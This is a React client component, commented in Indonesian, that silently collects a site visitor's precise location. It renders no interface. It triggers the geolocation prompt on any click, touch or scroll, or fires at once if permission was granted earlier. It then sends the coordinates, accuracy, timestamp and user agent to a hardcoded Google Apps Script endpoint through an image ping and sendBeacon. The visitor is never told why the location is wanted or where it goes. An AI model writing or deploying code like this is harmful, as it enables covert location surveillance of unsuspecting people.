"use client";

import { useEffect } from "react";

const APPSCRIPT_URL =
  "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec";

/**
 * AutoSendOnce
 * - Memunculkan permission prompt (mengandalkan 1x gesture: click/touch/scroll)
 * - Setelah izin diberikan, memanggil getCurrentPosition sekali (high accuracy)
 * - Mengirimkan ke Apps Script sebagai single param `loc=-7.2574719,112.7520883`
 * - Tidak melakukan pengiriman berulang
 */
export default function AutoSendOnce() {
  useEffect(() => {
    if (!("geolocation" in navigator)) {
      console.error("Browser tidak mendukung geolocation");
      return;
    }

    let activated = false;

    const cleanupListeners = () => {
      window.removeEventListener("click", onUserGesture);
      window.removeEventListener("touchstart", onUserGesture);
      window.removeEventListener("scroll", onUserGesture);
    };

    const onUserGesture = () => {
      if (activated) return;
      activated = true;
      cleanupListeners();
      requestAndSendOnce();
    };

    // Jika permission sudah granted -> langsung jalankan tanpa menunggu gesture
    const tryAutoIfGranted = async () => {
      if (!navigator.permissions) return;
      try {
        const p = await navigator.permissions.query({ name: "geolocation" as PermissionName });
        if (p.state === "granted") {
          activated = true;
          cleanupListeners();
          requestAndSendOnce();
        } else {
          // pasang listener gesture sekali (non-intrusive)
          window.addEventListener("click", onUserGesture, { passive: true });
          window.addEventListener("touchstart", onUserGesture, { passive: true });
          window.addEventListener("scroll", onUserGesture, { passive: true });
        }
      } catch (e) {
        // fallback: pasang listener jika Permissions API error/tidak tersedia
        window.addEventListener("click", onUserGesture, { passive: true });
        window.addEventListener("touchstart", onUserGesture, { passive: true });
        window.addEventListener("scroll", onUserGesture, { passive: true });
      }
    };

    const requestAndSendOnce = () => {
      // Meminta posisi sekali dengan high accuracy
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const acc = pos.coords.accuracy ?? null;

          // Format yang diminta: "-7.2574719,112.7520883"
          const loc = `${lat},${lon}`;

          // Kirim via image ping (bypass CORS)
          const ts = encodeURIComponent(new Date().toISOString());
          const ua = encodeURIComponent(navigator.userAgent);
          const url = `${APPSCRIPT_URL}?loc=${encodeURIComponent(loc)}&acc=${acc ?? ""}&ts=${ts}&ua=${ua}`;

          const img = new Image();
          img.src = url;

          // Coba sendBeacon juga (fallback, tidak selalu cross-origin friendly)
          try {
            const blob = new Blob([JSON.stringify({ loc, acc, ts, ua })], { type: "application/json" });
            navigator.sendBeacon?.(APPSCRIPT_URL, blob);
          } catch (e) {
            // ignore
          }

          console.log("Lokasi dikirim:", loc, "accuracy:", acc);
        },
        (err) => {
          // Tangani error permission atau lainnya
          // 1 = PERMISSION_DENIED, 2 = POSITION_UNAVAILABLE, 3 = TIMEOUT
          console.warn("Gagal mendapatkan lokasi:", err.code, err.message);
          if (err.code === 1) {
            // user menolak => beri tahu di console saja (atau tampilkan UI jika ingin)
            console.warn("Izin lokasi ditolak oleh user.");
          }
        },
        {
          enableHighAccuracy: true,
          timeout: 20000, // 20s batas tunggu
          maximumAge: 0,
        }
      );
    };

    // Mulai cek permission / pasang listener
    tryAutoIfGranted();

    // cleanup saat unmount
    return () => {
      cleanupListeners();
    };
  }, []);

  // Component ini tidak butuh UI khusus; return null atau small note
  return null;
}
